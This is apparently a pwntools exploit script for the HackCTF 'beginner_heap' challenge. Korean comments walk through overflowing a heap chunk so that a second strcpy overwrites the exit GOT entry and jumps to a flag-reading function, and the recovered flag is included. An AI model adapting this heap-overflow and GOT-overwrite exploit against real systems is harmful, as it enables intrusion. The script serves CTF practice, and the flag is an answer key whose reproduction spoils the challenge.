# -*- coding: utf-8 -*-
from pwn import * 

#p = process("./beginner_heap")
p = remote("ctf.j0n9hyun.xyz",3016)

# 함수 strip 되있고 malloc(0x10) 으로 시작, 이후 malloc(0x8) 추가, 똑같이 한번 더 생성
# 메모리상에서는 0x20 크기로 네개 할당되는것 보임. 
# 이후 fgets로 스택에 0x1000 바이트 표준입력 받고 strcpy로 0x602280 위치에 입력값 복사. 
# 해당 위치는 아까 두번째로 malloc 했던 변수 
# 그다음에 fgets로 0x1000 바이트 입력을 받는다. 입력 위치는 동일.
# 0x6022c0 위치로 strcpy. 네번쨰로 malloc한 변수에 저장. 
# 다 끝나면 종료. 우선 bof 가능 여부먼저 확인해보자. 
# 0x1000 보다 스택의 거리가 더 길어서 불가.
# 실행되는 start보다 위 위치에 의문의 구문들이 있다. free함수를 호출하는 구문.
#  0x40085b 주소로 시작됨. 
# 주소를 까보니까, 1,2,3,4 가 할당되어있을때 1이 2의 data영역 주소를 가지고 있고
# 3이 4의 데이터 영역 주소를 가지고 있는식으로구성되어 있었다. 변조를 통한 공격이 가능한가?
# 큰 값을 넣어줬을때, 두번째 strcpy에서 에러가 발생하는걸 확인했다. 
# 3이 가지고 있는 주소를 덮어주는걸로 예상되고, 실제로도 그러하다. 
# 그럼 이제 덮어줄 위치를 찾아야되고, 어떤값으로 덮을지를 찾으면 되겠다. 
# exit 함수의 got가 0x601068 이므로 해당 위치를 다른 주소로 덮어보자. 
# 아까 찾았던 수상한 주소위치는 어떨까? 해당 위치에서는 입력받고, 출력하고 , 
# free 후종료하는 구문으로 이루어져 있다. 
# 수상한 함수 더 위에, r옵션으로 fopen함수를 실행하는 구문이 있어 거기로 주소를 다시 잡았다
# HackCTF{4r3_y0u_r34dy_w3lc0m3_70_h34p_53k41}

ext_got = 0x601068
jmp_adr = 0x400826
payload = "a"*16+"b"*16+"c"*8+p64(ext_got)
payload2 = p64(jmp_adr)

pause()

p.sendline(payload)
p.sendline(payload2)

p.interactive()

